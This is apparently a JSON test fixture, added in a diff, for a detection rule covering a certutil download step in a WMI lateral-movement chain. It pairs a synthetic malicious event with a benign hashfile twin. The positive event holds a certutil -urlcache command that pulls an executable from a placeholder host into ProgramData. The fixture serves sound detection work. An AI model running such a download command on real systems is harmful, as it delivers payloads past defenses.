@@ -1,0 +1,113 @@
+{
+  "rule": {
+    "source": "prebuilt",
+    "rule_id": "fd70c98a-c410-42dc-a2e3-761c71848acf"
+  },
+  "chain": "wmi-lateral",
+  "step": "certutil download",
+  "positive": {
+    "docs": [
+      {
+        "stream": "logs-endpoint.events.process",
+        "at": -120,
+        "doc": {
+          "event": {
+            "category": [
+              "process"
+            ],
+            "type": [
+              "start"
+            ],
+            "action": "start",
+            "kind": "event"
+          },
+          "host": {
+            "name": "wks-karen-06",
+            "id": "azqa-wks-karen-06",
+            "os": {
+              "type": "windows",
+              "family": "windows"
+            },
+            "hostname": "wks-karen-06"
+          },
+          "user": {
+            "name": "karen.d",
+            "domain": "CORP",
+            "id": "S-1-5-21-1111-2222-3333-1105"
+          },
+          "process": {
+            "name": "certutil.exe",
+            "executable": "C:\\Windows\\System32\\certutil.exe",
+            "command_line": "certutil -urlcache -split -f https://updates.legitimatesoft.example.com/a.exe C:\\ProgramData\\a.exe",
+            "args": [
+              "certutil",
+              "-urlcache",
+              "-split",
+              "-f",
+              "https://updates.legitimatesoft.example.com/a.exe",
+              "C:\\ProgramData\\a.exe"
+            ],
+            "entity_id": "azqa-certutil.exe-976369",
+            "parent": {
+              "name": "cmd.exe",
+              "executable": "C:\\Windows\\System32\\cmd.exe",
+              "entity_id": "azqa-cmd.exe-924631"
+            }
+          }
+        }
+      }
+    ]
+  },
+  "negative": {
+    "twin_delta": "certutil used for a benign -hashfile integrity check (the noise-layer pattern)",
+    "docs": [
+      {
+        "stream": "logs-endpoint.events.process",
+        "at": -120,
+        "doc": {
+          "event": {
+            "category": [
+              "process"
+            ],
+            "type": [
+              "start"
+            ],
+            "action": "start",
+            "kind": "event"
+          },
+          "host": {
+            "name": "wks-karen-06",
+            "id": "azqa-wks-karen-06",
+            "os": {
+              "type": "windows",
+              "family": "windows"
+            },
+            "hostname": "wks-karen-06"
+          },
+          "user": {
+            "name": "karen.d",
+            "domain": "CORP",
+            "id": "S-1-5-21-1111-2222-3333-1105"
+          },
+          "process": {
+            "name": "certutil.exe",
+            "executable": "C:\\Windows\\System32\\certutil.exe",
+            "command_line": "certutil -hashfile C:\\iso\\win.iso SHA256",
+            "args": [
+              "certutil",
+              "-hashfile",
+              "C:\\iso\\win.iso",
+              "SHA256"
+            ],
+            "entity_id": "azqa-certutil.exe-617465",
+            "parent": {
+              "name": "cmd.exe",
+              "executable": "C:\\Windows\\System32\\cmd.exe",
+              "entity_id": "azqa-cmd.exe-924631"
+            }
+          }
+        }
+      }
+    ]
+  }
+}
